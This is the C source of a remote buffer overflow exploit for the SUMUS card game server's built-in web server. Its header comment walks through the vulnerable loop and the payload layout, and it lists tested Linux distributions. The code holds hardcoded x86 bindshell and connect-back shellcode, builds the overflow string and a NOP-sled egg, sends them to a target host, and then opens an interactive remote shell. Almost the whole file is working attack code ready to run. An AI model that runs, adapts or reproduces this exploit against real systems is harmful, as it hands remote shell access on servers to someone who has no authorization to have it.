

 /*[ sumus[v0.2.2]: (httpd) remote buffer overflow exploit. ]****
  *                                                             *
  * by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)            *
  *                                                             *
  * compile:                                                    *
  *  gcc xsumus.c -o xsumus                                     *
  *                                                             *
  * syntax:                                                     *
  *  ./xsumus [-pscrln] -h host                                 *
  *                                                             *
  * sumus homepage/url:                                         *
  *  http://sumus.sourceforge.net                               *
  *                                                             *
  * Mus is a Spanish cards game played by 4 folks around a      *
  * table. SUMUS is a server for playing mus over Internet. The *
  * project is just the server, but Java applet and Linux       *
  * console clients are provided.                               *
  *                                                             *
  * SUMUS contains a remotely exploitable buffer overflow in    *
  * the httpd portion of its server code, which runs            *
  * automatically upon starting the SUMUS server(usually port   *
  * 81).                                                        *
  *                                                             *
  * the overflow itself occurs on the stack, but it isn't quite *
  * cut and dry as normal.  this overflow occurs in a while()   *
  * byte-by-byte write loop, and the integers used in the loop  *
  * get overwritten before it makes it to the eip/return        *
  * address.  this is best explained by viewing the code        *
  * itself:                                                     *
  *                                                             *
  * ----------------------------------------------------------- *
  * char Buffer[65536] ;                                        *
  * ...                                                         *
  * k = recv( SocketWebPendientes[ j ], Buffer, 20480, 0 ) ;    *
  * if( k > 0 )                                                 *
  *  RespondeHTTPPendiente( j ) ;                               *
  * ...                                                         *
  * void RespondeHTTPPendiente( int Pos )                       *
  * {                                                           *
  *  int j ,kk ,faltan ;                                        *
  *  char tmpCad[100], *p1, *p2 ;                               *
  *  FILE *f ;                                                  *
  *                                                             *
  *  Buffer[400] = 0 ;                                          *
  *  p1 = strstr( Buffer, "GET" ) ;                             *
  *  if( p1 == NULL ) p1 = strstr( Buffer, "Get" ) ;            *
  *  if( p1 == NULL ) p1 = strstr( Buffer, "get" ) ;            *
  *  if( p1 != NULL )                                           *
  *   {                                                         *
  *    j = 5 ;                                                  *
  *    kk = 0 ;                                                 *
  *    if( j < strlen(p1) )                                     *
  *      while ( p1[j] != ' ' && p1[j] )                        *
  *     tmpCad[kk++] = p1[j++] ;                                *
  *    tmpCad[kk] = 0 ;                                         *
  *   }                                                         *
  * ...                                                         *
  * ----------------------------------------------------------- *
  *                                                             *
  * as you can see this makes for a special situation.  the     *
  * best method i came up with was to format the buffer like    *
  * so:                                                         *
  *  [400 bytes]                             | [20000 bytes]    *
  *  [FILLER]["GET"][FILLER][new "kk"][ADDR] | [EGG/SHELLCODE]  *
  *                                                             *
  * this way since the new "kk"/addr ends right the 400         *
  * boundary point, only the overwritten "kk" integer needs to  *
  * be worried about(and not the "j" integer as well).          *
  *                                                             *
  * i mainly made this because it was a moderatly different     *
  * exploit method than the norm.  figured i'd see if it could  *
  * be done, and here we are.                                   *
  *                                                             *
  * tested with default values(on static binary):               *
  * + gentoo-r5           : successful.                         *
  * + mandrake9.1/default : successful.                         *
  * + mandrake9.1/secure  : failed.                             *
  * + fedora core2        : successful.                         *
  ***************************************************************/
#include <stdio.h>
#include <stdlib.h>
#ifndef __USE_BSD
#define __USE_BSD
#endif
#include <string.h>
#include <strings.h>
#include <signal.h>
#include <unistd.h>
#include <netdb.h>
#include <getopt.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define BUFSIZE 399
#define EGGSIZE 20000
#define TIMEOUT 10
#define DFL_PORT 81
#define DFL_SPORT 7979
#define DFL_RETADDR 0x0805a001
#define DFL_LOCT_KK 105
#define DFL_JUMP_KK 10

/* globals. */
static char x86_bind[]= /* bindshell, from netric. */
 "\x31\xc0\x50\x40\x89\xc3\x50\x40\x50\x89\xe1\xb0\x66"
 "\xcd\x80\x31\xd2\x52\x66\x68\xff\xff\x43\x66\x53\x89"
 "\xe1\x6a\x10\x51\x50\x89\xe1\xb0\x66\xcd\x80\x40\x89"
 "\x44\x24\x04\x43\x43\xb0\x66\xcd\x80\x83\xc4\x0c\x52"
 "\x52\x43\xb0\x66\xcd\x80\x93\x89\xd1\xb0\x3f\xcd\x80"
 "\x41\x80\xf9\x03\x75\xf6\x52\x68\x6e\x2f\x73\x68\x68"
 "\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd"
 "\x80";
static char x86_conn[]= /* connect-back, eSDee/netric. */
 "\x31\xc0\x31\xdb\x31\xc9\x51\xb1\x06\x51\xb1\x01\x51"
 "\xb1\x02\x51\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc2"
 "\x31\xc0\x31\xc9\x51\x51\x68\xff\xff\xff\xff\x66\x68"
 "\xff\xff\xb1\x02\x66\x51\x89\xe7\xb3\x10\x53\x57\x52"
 "\x89\xe1\xb3\x03\xb0\x66\xcd\x80\x31\xc9\x39\xc1\x74"
 "\x06\x31\xc0\xb0\x01\xcd\x80\x31\xc0\xb0\x3f\x89\xd3"
 "\xcd\x80\x31\xc0\xb0\x3f\x89\xd3\xb1\x01\xcd\x80\x31"
 "\xc0\xb0\x3f\x89\xd3\xb1\x02\xcd\x80\x31\xc0\x31\xd2"
 "\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
 "\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd"
 "\x80";
char *x86_ptr;
struct{
 unsigned char new_kk;
 signed short loct_kk;
 unsigned int addr;
 char *host;
 unsigned short port;
 unsigned short sport;
}tbl;

/* lonely extern. */
extern char *optarg;

/* functions. */
char *getbuf(unsigned int);
char *getegg(unsigned int);
unsigned short sumus_connect(char *,unsigned short);
void getshell(char *,unsigned short);
signed int getshell_bind_init(unsigned short);
signed int getshell_bind_accept(signed int);
signed int getshell_conn(char *,unsigned short);
void proc_shell(signed int);
void printe(char *,short);
void usage(char *);
void sig_alarm(){printe("alarm/timeout hit.",1);}

/* start. */
int main(int argc,char **argv){
 unsigned char tmp_new=0;
 signed int chr=0,rsock=0;
 unsigned int bs=0;
 struct hostent *t;
 in_addr_t s=0;
 printf("[*] sumus[v0.2.2]: (httpd) remote buffer overflow explo"
 "it.\n[*] by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)\n\n");
 tbl.port=DFL_PORT;
 tbl.sport=DFL_SPORT;
 tbl.addr=DFL_RETADDR;
 tbl.loct_kk=DFL_LOCT_KK;
 while((chr=getopt(argc,argv,"h:p:s:c:r:l:n:"))!=EOF){
  switch(chr){
   case 'h':
    if(!tbl.host&&!(tbl.host=(char *)strdup(optarg)))
     printe("main(): allocating memory failed",1);
    break;
   case 'p':
    tbl.port=atoi(optarg);
    break;
   case 's':
    tbl.sport=atoi(optarg);
    break;
   case 'c':
    if((s=inet_addr(optarg))){
     if((t=gethostbyname(optarg)))
      memcpy((char *)&s,(char *)t->h_addr,sizeof(s));
     if(s==-1)s=0;
     if(!s)printe("invalid host/ip. (-c option)",0);
    }
    break;
   case 'r':
    sscanf(optarg,"%x",&tbl.addr);
    break;
   case 'l':
    tbl.loct_kk=atoi(optarg);
    break;
   case 'n':
    tmp_new=atoi(optarg);
    break;
   default:
    usage(argv[0]);
    break;
  }
 }
 if(!tbl.host)usage(argv[0]);
 if(tbl.loct_kk<0||tbl.loct_kk>BUFSIZE)tbl.loct_kk=DFL_LOCT_KK;
 /* set bind port for shellcode. */
 if(!s){
  bs=strlen(x86_bind);
  x86_bind[20]=(tbl.sport&0xff00)>>8;
  x86_bind[21]=(tbl.sport&0x00ff);
  x86_ptr=x86_bind;
 }
 /* set connect-back ip/port for shellcode. */
 else{
  bs=strlen(x86_conn);
  x86_conn[33]=(s&0x000000ff);
  x86_conn[34]=(s&0x0000ff00)>>8;
  x86_conn[35]=(s&0x00ff0000)>>16;
  x86_conn[36]=(s&0xff000000)>>24;
  x86_conn[39]=(tbl.sport&0xff00)>>8;
  x86_conn[40]=(tbl.sport&0x00ff);
  x86_ptr=x86_conn;
 }
 if(bs!=strlen(x86_ptr))
  printe("ip(-c option) and/or port(-s option) appear to contain a "
  "null-byte, try again.",1);
 tbl.new_kk=(tbl.loct_kk+(tmp_new?tmp_new:DFL_JUMP_KK));
 if(!tbl.new_kk)
  printe("ip(-l/-n option) made the overwritten \"kk\" integer a "
  "null-byte.",1);
 printf("[*] target\t\t\t: %s:%d\n",tbl.host,tbl.port);
 printf("[*] shellcode type\t\t: %s(port=%d)\n",
 (s?"connect-back":"bindshell"),tbl.sport);
 printf("[*] return address($eip)\t: 0x%.8x\n",tbl.addr);
 printf("[*] overwritten \"kk\" int value\t: "
 "%u(0x%.2x)\n",tbl.new_kk,tbl.new_kk);
 printf("[*] overflow size\t\t: %u(tot=%u) byte(s)\n",
 tbl.loct_kk,BUFSIZE);
 printf("[*] egg size\t\t\t: %u byte(s)\n\n",EGGSIZE);
 if(s){
  rsock=getshell_bind_init(tbl.sport);
  sumus_connect(tbl.host,tbl.port);
  rsock=getshell_bind_accept(rsock);
 }
 else{
  sumus_connect(tbl.host,tbl.port);
  rsock=getshell_conn(tbl.host,tbl.sport);
 }
 if(rsock>0)proc_shell(rsock);
 exit(0);
}
char *getbuf(unsigned int addr){
 char *buf;
 if(!(buf=(char *)malloc(BUFSIZE+1)))
  printe("getbuf(): allocating memory failed.",1);
 /* 0x08 helps hide the appearance of a giant string, */
 /* for the server side display.                      */
 memset(buf,0x08,BUFSIZE);
 memcpy(buf+(BUFSIZE-tbl.loct_kk-9),"GET",3);
 /* this will overwrite the "kk" integer of the sumus server. */
 buf[BUFSIZE-5]=tbl.new_kk;
 /* the address/value used to write in the while() loop right */
 /* after the "kk" integer has been overwritten/changed. */
 *(long *)&buf[BUFSIZE-4]=addr;
 buf[BUFSIZE]='\n';
 return(buf);
}
char *getegg(unsigned int size){
 char *buf;
 if(!(buf=(char *)malloc(size+1)))
  printe("getegg(): allocating memory failed",1);
 memset(buf,0x90,(size-strlen(x86_ptr)));
 memcpy(buf+(size-strlen(x86_ptr)),x86_ptr,
 strlen(x86_ptr));
 return(buf);
}
unsigned short sumus_connect(char *hostname,unsigned short port){
 signed int sock;
 struct hostent *t;
 struct sockaddr_in s;
 sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
 s.sin_family=AF_INET;
 s.sin_port=htons(port);
 printf("[*] attempting to connect: %s:%d.\n",hostname,port);
 if((s.sin_addr.s_addr=inet_addr(hostname))){
  if(!(t=gethostbyname(hostname)))
   printe("couldn't resolve hostname.",1);
  memcpy((char *)&s.sin_addr,(char *)t->h_addr,sizeof(s.sin_addr));
 }
 signal(SIGALRM,sig_alarm);
 alarm(TIMEOUT);
 if(connect(sock,(struct sockaddr *)&s,sizeof(s)))
  printe("sumus connection failed.",1);
 alarm(0);
 printf("[*] successfully connected: %s:%d.\n",hostname,port);
 printf("[*] sending string: [FILLER][\"GET\"][FILLER][new \"kk\"]"
 "[ADDR][EGG]\n");
 sleep(1);
 write(sock,getbuf(tbl.addr),BUFSIZE);
 write(sock,getegg(EGGSIZE),EGGSIZE);
 sleep(1);
 printf("[*] closing connection.\n\n");
 close(sock);
 return(0);
}
signed int getshell_bind_init(unsigned short port){
 signed int ssock=0,so=1;
 struct sockaddr_in ssa;
 ssock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
 setsockopt(ssock,SOL_SOCKET,SO_REUSEADDR,(void *)&so,sizeof(so));
#ifdef SO_REUSEPORT
 setsockopt(ssock,SOL_SOCKET,SO_REUSEPORT,(void *)&so,sizeof(so));
#endif
 ssa.sin_family=AF_INET;
 ssa.sin_port=htons(port);
 ssa.sin_addr.s_addr=INADDR_ANY;
 if(bind(ssock,(struct sockaddr *)&ssa,sizeof(ssa))==-1)
  printe("could not bind socket.",1);
 listen(ssock,1);
 return(ssock);
}
signed int getshell_bind_accept(signed int ssock){
 signed int sock=0;
 unsigned int salen=0;
 struct sockaddr_in sa;
 memset((char*)&sa,0,sizeof(struct sockaddr_in));
 salen=sizeof(sa);
 printf("[*] awaiting connection from: *:%d.\n",tbl.sport);
 alarm(TIMEOUT);
 sock=accept(ssock,(struct sockaddr *)&sa,&salen);
 alarm(0);
 close(ssock);
 printf("[*] connection established. (connect-back)\n");
 return(sock);
}
signed int getshell_conn(char *hostname,unsigned short port){
 signed int sock=0;
 struct hostent *he;
 struct sockaddr_in sa;
 if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)
  printe("getshell_conn(): socket() failed.",1);
 sa.sin_family=AF_INET;
 if((sa.sin_addr.s_addr=inet_addr(hostname))){
  if(!(he=gethostbyname(hostname)))
   printe("getshell_conn(): couldn't resolve.",1);
  memcpy((char *)&sa.sin_addr,(char *)he->h_addr,
  sizeof(sa.sin_addr));
 }
 sa.sin_port=htons(port);
 signal(SIGALRM,sig_alarm);
 printf("[*] attempting to connect: %s:%d.\n",hostname,port);
 alarm(TIMEOUT);
 if(connect(sock,(struct sockaddr *)&sa,sizeof(sa))){
  printf("[!] connection failed: %s:%d.\n",hostname,port);
  exit(1);
 }
 alarm(0);
 printf("[*] successfully connected: %s:%d.\n\n",hostname,port);
 return(sock);
}
void proc_shell(signed int sock){
 signed int r=0;
 char buf[4096+1];
 fd_set fds;
 signal(SIGINT,SIG_IGN);
 write(sock,"uname -a;id\n",13);
 while(1){
  FD_ZERO(&fds);
  FD_SET(0,&fds);
  FD_SET(sock,&fds);
  if(select(sock+1,&fds,0,0,0)<1)
   printe("getshell(): select() failed.",1);
  if(FD_ISSET(0,&fds)){
   if((r=read(0,buf,4096))<1)
    printe("getshell(): read() failed.",1);
   if(write(sock,buf,r)!=r)
    printe("getshell(): write() failed.",1);
  }
  if(FD_ISSET(sock,&fds)){
   if((r=read(sock,buf,4096))<1)exit(0);
   write(1,buf,r);
  }
 }
 close(sock);
 return;
}
void printe(char *err,short e){
 printf("[!] %s\n",err);
 if(e)exit(1);
 return;
}
void usage(char *progname){
 printf("syntax: %s [-pscrln] -h host\n\n",progname);
 printf("  -h <host/ip>\ttarget hostname/ip.\n");
 printf("  -p <port>\ttarget port.\n");
 printf("  -s <port>\tconnect-back/bind port. (shellcode)\n");
 printf("  -c <host/ip>\tconnect-back host/ip. (enables "
 "connect-back)\n");
 printf("  -r <addr>\tdefine return address. (0x%.8x)\n",tbl.addr);
 printf("  -l <value>\tdistance from the start pointer. (\"GET\")\n");
 printf("  -n <offset>\tadds to the overwritten \"kk\" integer.\n\n");
 exit(0);
}

